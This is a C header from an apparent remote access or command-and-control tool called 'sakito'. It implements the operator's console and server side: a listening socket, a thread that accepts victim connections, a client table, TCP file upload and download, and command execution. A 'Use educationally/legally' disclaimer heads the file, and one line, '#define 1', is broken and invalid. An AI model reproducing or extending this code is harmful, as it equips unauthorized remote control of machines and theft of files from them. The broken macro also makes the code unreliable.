/* 
Coded by d4rkstat1c.
Use educationally/legally.
*/
#ifndef SAKITO_SLIN_UTILS_H
#define SAKITO_SLIN_UTILS_H

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <netdb.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/sendfile.h>
#include "nbo_encoding.h"

#define CONSOLE_FSTR "sak1to-console:~%s$ "
#define INTERACT_FSTR "┌%d─%s\n└%s>"
#define 1
#define SOCKET int
#define INVALID_SOCKET -1
#define SOCKET_ERROR -1
#define _FILE_OFFSET_BITS 64
#define INVALID_FILE -1
#define READ 1
#define WRITE 0

/*
Below contains sakito API macros that alias/wrap various unix/specific functions and syscalls.
*/

// Store current working directory in a provided buffer.
#define get_cwd(buf) getcwd(buf, BUFLEN)

// Write/send data to a given socket file descriptor.
#define sakito_tcp_send(socket, buf, count) write(socket, buf, count)

// Read/receive data from a given socket file descriptor.
#define sakito_tcp_recv(socket, buf, count) read(socket, buf, count)

// Write to stdout.
#define write_stdout(buf, count) write(STDOUT_FILENO, buf, count)

// Close a file descriptor.
#define sakito_close_file(file) close(file)

// Closing a socket to match Windows' closesocket() WINAPI's signature.
#define closesocket(socket) close(socket)

typedef int s_file;

// Mutex lock for pthread race condition checks.
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
// Variable for mutex condition.
pthread_cond_t  consum = PTHREAD_COND_INITIALIZER;

typedef struct {
	// Client hostname.
	char* host;

	// Client socket.
	SOCKET sock;

} Conn;

typedef struct {
	// Server buffer.
	char buf[BUFLEN + 9]; // BUFLEN + space for 'command code' + "cmd /C " + '\0'

	// Server socket for accepting connections.
	int listen_socket;

	// Pthread object for handling execution/termination of accept_conns thread.
	pthread_t acp_thread;

	// Flag for race condition checks.
	int THRD_FLAG;

	// Array of Conn objects/structures.
	Conn* clients;

	// Memory blocks allocated.
	size_t clients_alloc;

	// Amount of memory used.
	size_t clients_sz;

} Server_map;

/*
Below contains linux specific sakito API functions.
*/

void bind_socket(const SOCKET listen_socket);
void sakito_accept_conns(Server_map* const s_map);
void resize_conns(Server_map* const s_map, int client_id);

// wrapper for terminating server.
void terminate_server(int listen_socket, const char* const error) 
{
	close(listen_socket);
	int err_code = EXIT_SUCCESS;
	if (error) 
	{
		err_code = 1;
		perror(error);
	}

	exit(err_code);
}

// Create a socket file descriptor.
int create_socket() 
{
	int listen_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (listen_socket == -1) 
	{
		perror("Socket creation failed.\n");
		exit(1); 
	} 
 
	if (setsockopt(listen_socket, SOL_SOCKET, SO_REUSEADDR, &(int) {1}, sizeof(int)) != 0)
		terminate_server(listen_socket, "Setting socket options failed.\n");
 
	return listen_socket;
}

// Mutex unlock functionality.
void mutex_lock(Server_map* const s_map) 
{
	// Wait until THRD_FLAG evaluates to false.
	while (s_map->THRD_FLAG)
		pthread_cond_wait(&consum, &lock);

	pthread_mutex_lock(&lock);

	// We're now locking the mutex so we can modify shared memory in a thread safe manner.
	s_map->THRD_FLAG = 1;
}

// Mutex unlocking functionality.
void mutex_unlock(Server_map* const s_map) 
{
	pthread_mutex_unlock(&lock);

	// Set THRD_FLAG to false to communicate with mutex_lock() that we have finished modifying shared memory.
	s_map->THRD_FLAG = 0;
}

// Call open() to return s_file which is a typedef alias for int/file descriptors.
s_file sakito_open_file(const char* filename, int rw_flag) 
{
	// Supports only read/write modes.
	if (rw_flag == WRITE)
		return open(filename, O_CREAT | O_WRONLY | O_TRUNC);
	else if (rw_flag == READ)
		return open(filename, O_RDONLY);

	return INVALID_FILE;
}

// TCP file transfer logic (receive).
int sakito_recv_file(const SOCKET socket, s_file file, char* const buf, uint64_t f_size) 
{
	// Varaible to keep track of downloaded data.
	int i_result = SUCCESS;
	uint64_t total = 0;

	do
		i_result = read(socket, buf, BUFLEN);
	while ((i_result > 0)
			&& (write(file, buf, i_result))
			&& ((total += (uint64_t)i_result) != f_size));

	return i_result;
}

// Calculate file size of a given s_file/file descriptor.
uint64_t sakito_file_size(s_file file) 
{
	uint64_t f_size = (uint64_t)lseek64(file, 0, SEEK_END);
	// Return file descriptor to start of file.
	lseek64(file, 0, SEEK_SET);

	return f_size;
}

// TCP file transfer logic (send).
int sakito_send_file(int socket, int file, char* const buf, uint64_t f_size) 
{
	// Calculate file size and serialize the file size integer.
	uint64_t no_bytes = htonll(f_size);

	// Send the serialized file size bytes.
	if (write(socket, &no_bytes, sizeof(uint64_t)) < 1)
		return SOCKET_ERROR;

	int i_result = SUCCESS;

	// Stream file at kernel level to client.
	if (f_size > 0)
	{
		while ((i_result != FAILURE) && (f_size > 0))
		{
			i_result = sendfile(socket, file, NULL, f_size);
			f_size -= i_result;
		}
	}

	return i_result;
}

// Execute a command via the host system.
void exec_cmd(Server_map* const s_map) 
{
	// Call Popen to execute command(s) and read the processes' output.
	FILE* fpipe = popen(s_map->buf, "r");

	// Stream/write command output to stdout.
	int rb = 0;
	do 
	{
		rb = fread(s_map->buf, 1, BUFLEN, fpipe);
		fwrite(s_map->buf, 1, rb, stdout);
	} while (rb == BUFLEN);
 
	// Close the pipe.
	pclose(fpipe);
}

// Terminating the console application and server. 
void terminate_console(Server_map* const s_map) 
{
	// Quit accepting connections.
	pthread_cancel(s_map->acp_thread);

	// if there's any connections close them before exiting.
	if (s_map->clients_sz) 
	{
		for (size_t i = 0; i < s_map->clients_sz; i++)
			close(s_map->clients[i].sock);
		// Free allocated memory.
		free(s_map->clients);
	}

	terminate_server(s_map->listen_socket, NULL);
}

// Thread to recursively accept connections.
void* accept_conns(void* param) 
{
	// Call sakito wrapper function to accept incoming connections.
	Server_map* const s_map = (Server_map*)param;

	// Create our socket object.
	s_map->listen_socket = create_socket();

	// Bind socket to port.
	bind_socket(s_map->listen_socket);

	// Call wrapper function to accept incoming connections.
	sakito_accept_conns(s_map);

	return NULL;
}

// Initialization API of the console application and server.
void sakito_init(Server_map* const s_map) 
{
	// Set out race condition flag to false.
	s_map->THRD_FLAG = 0;

	// Start our accept connections thread to recursively accept connections.
	pthread_create(&s_map->acp_thread , NULL, accept_conns, s_map);
}

#endif
